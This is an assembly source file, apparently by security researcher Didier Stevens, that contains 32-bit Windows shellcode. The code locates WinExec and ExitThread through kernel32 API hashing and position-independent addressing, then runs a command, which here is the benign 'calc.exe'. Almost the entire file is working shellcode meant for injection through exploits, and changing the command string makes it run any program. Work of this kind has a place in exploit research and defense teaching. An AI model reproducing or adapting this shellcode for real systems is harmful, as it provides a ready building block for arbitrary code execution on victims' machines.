; Shellcode to execute an EXE with WinExec
; Written for NASM assembler (http://www.nasm.us) by Didier Stevens
; https://DidierStevens.com
; Use at your own risk
;
; History:
;   2009/10/22: start

BITS 32

KERNEL32_HASH equ 0x000d4e88
KERNEL32_NUMBER_OF_FUNCTIONS equ 2
KERNEL32_WINEXEC_HASH equ 0x06fea
KERNEL32_EXITTHREAD_HASH equ 0x035d94

segment .text
	call geteip
geteip:
	pop ebx

  ; Setup environment kernel32
	lea esi, [KERNEL32_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [KERNEL32_HASHES_TABLE-geteip+ebx]
	push esi
	push KERNEL32_NUMBER_OF_FUNCTIONS
	push KERNEL32_HASH
	call LookupFunctions

	; UINT WINAPI WinExec(__in  LPCSTR lpCmdLine, __in  UINT uCmdShow);
	push 0x00
	lea eax, [COMMAND-geteip+ebx]
	push eax
	call [KERNEL32_WINEXEC-geteip+ebx]

	; VOID WINAPI ExitThread(__in  DWORD dwExitCode);
	push 0x00
	call [KERNEL32_EXITTHREAD-geteip+ebx]

%include "sc-api-functions.asm"
	
KERNEL32_HASHES_TABLE:
	dd KERNEL32_WINEXEC_HASH
	dd KERNEL32_EXITTHREAD_HASH
	
KERNEL32_FUNCTIONS_TABLE:
KERNEL32_WINEXEC dd 0x00000000
KERNEL32_EXITTHREAD dd 0x00000000

COMMAND:
	db "calc.exe", 0
